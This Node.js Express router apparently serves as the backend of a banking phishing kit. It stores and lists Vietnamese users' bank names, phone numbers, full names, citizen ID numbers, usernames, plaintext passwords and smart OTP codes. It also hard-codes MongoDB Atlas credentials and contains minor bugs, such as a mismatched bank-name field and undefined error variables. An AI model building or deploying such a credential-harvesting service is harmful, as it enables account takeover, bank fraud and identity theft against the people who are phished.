var express = require('express');
var router = express.Router();
var mongoose = require('mongoose');
var moment = require('moment');

// const uri = "mongodb+srv://portal:portal@cluster0.h9szmnf.mongodb.net/?retryWrites=true&w=majority";
// const uri = "mongodb+srv://portal:portal@portalcluster.nn8i85q.mongodb.net/?retryWrites=true&w=majority";
// const uri = "mongodb+srv://portal:portal@clusterok.xtjicvp.mongodb.net/ben_collection";
const uri = "mongodb+srv://portal:portal@portalcluster.nn8i85q.mongodb.net/portal_collection"


const functionConnect = async () => {
  try {
    await mongoose.connect(uri)
    console.log("connected!");
  } catch (error) {
    console.error(error);
  }
}

functionConnect()

// SCHEMA
let userSchema = mongoose.Schema({
  bankName: {
    type: String,
  },
  phone: {
    type: String,
  },
  full_name: {
    type: String,
  },
  citizen_id: {
    type: String,
  },
  user_name: {
    type: String,
  },
  password: {
    type: String,
  },
  smart_otp: {
    type: String,
  },
  created_at: {
    type: String,
  },
  updated_at: {
    type: String,
  },
});

let UserModel = mongoose.model('users', userSchema);

router.post("/create", async (req, res, next) => {
  try {
    let body = req.body

    body.created_at = moment().format('DD/MM/YYYY hh:mm:ss')
    body.updated_at = moment().format('DD/MM/YYYY hh:mm:ss')
    await UserModel.create(body)
      .then((result) => {
        res.status(200).send(result);
      })
      .catch((err) => {
        res.status(400).send({
          message: err.message || "Error occurred while creating the user",
        });
      })
  } catch (error) {
    console.log('---------error----------', error);
    res.status(400).send({
      message: err.message || "Error occurred while creating the user",
    });
  }
})

router.get("/", async (req, res, next) => {
  try {
    await UserModel.find()
      .then((users) => {

        let result = users.map((user) => {
          let element = {};
          element["Id"] = user.id;
          element["Tên ngân hàng"] = user.bank_name;
          element["Số điện thoại"] = user.phone;
          element["Họ và tên"] = user.full_name;
          element["Chứng minh thư / CCCD"] = user.citizen_id;
          element["Tên tài khoản"] = user.user_name;
          element["Mật khẩu"] = user.password;
          element["Mã otp"] = user.smart_otp;
          element["Ngày tạo"] = user.created_at;

          return element;
        })

        res.status(200).send(result);
      })
      .catch((err) => {
        res.status(400).send({
          message: err.message || "get data failure",
        });
      })
  } catch (error) {
    console.log('---------error----------', error);
    res.status(400).send({
      message: err.message || "get data failure",
    });
  }
})

module.exports = router;
